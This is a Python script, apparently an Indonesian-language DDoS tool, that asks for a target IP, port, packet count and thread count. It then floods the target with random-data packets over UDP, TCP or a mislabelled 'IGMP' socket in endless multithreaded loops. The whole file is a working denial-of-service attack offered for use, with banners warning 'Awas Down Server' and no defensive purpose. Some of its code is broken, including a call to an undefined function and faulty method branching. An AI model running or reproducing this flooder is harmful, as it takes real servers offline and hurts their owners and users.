
import random
import socket
import threading
import time
import os

os.system("cls")
os.system("clear")

print(" WARNING !! Jika Error Threads dan Packets nya Harus Di Bawah 500")

def igmp():
    for y in range(threads):
	    th = threading.Thread(target = ig)
	    th.start()
        
def udp():
    for y in range(threads):
	    th = threading.Thread(target = run)
	    th.start()
        
def tcp():
    for y in range(threads):
	    th = threading.Thread(target = run2)
	    th.start()
        
        
def run():
	data = random._urandom(60024)
	i = random.choice(("[-]","[+]","[#]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"CONNECT ")
		except:
			print(i +"ATTACK SUCCES ")
              
def ig():
	data = random._urandom(1024)
	i = random.choice(("[-]","[+]","[#]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_RDM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"CONNECT")
		except:
			print(i +"ATTACK SUCCES ")

def run2():
	data = random._urandom(600000)
	i = random.choice(("[-]","[+]","[#]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"CONNECT ")
		except:
			print(i +"ATTACK SUCCES ")
     
print("------------------------------------------------")
print("[+] Tools Ddos By : Zero")
print("[+] Pemilik Tools : Zero")
print("[+] Awas Down Server")
print("------------------------------------------------")
ip = str(input(" IP : "))
port = int(input(" Port (80/3389) : "))
times = int(input(" Packtes (500) or (90048) : " ))
threads = int(input(" Threads (500) or (90048) : " ))
def tolol():
    global gilak
    global method
    global ip
    global threads
    global port
    global times
method = input(" Method (TCP/UDP/IGMP) : ")
if method == "TCP":
   print("TCP")
   tcp()
if method == "UDP":
   print("UDP")
   udp()
if method == "IGMP":
   print("IGMP")
   igmp()
else:
   print(" ERROR METHOD TRY AGAIN ")
   time.sleep(5)
   stop()
 

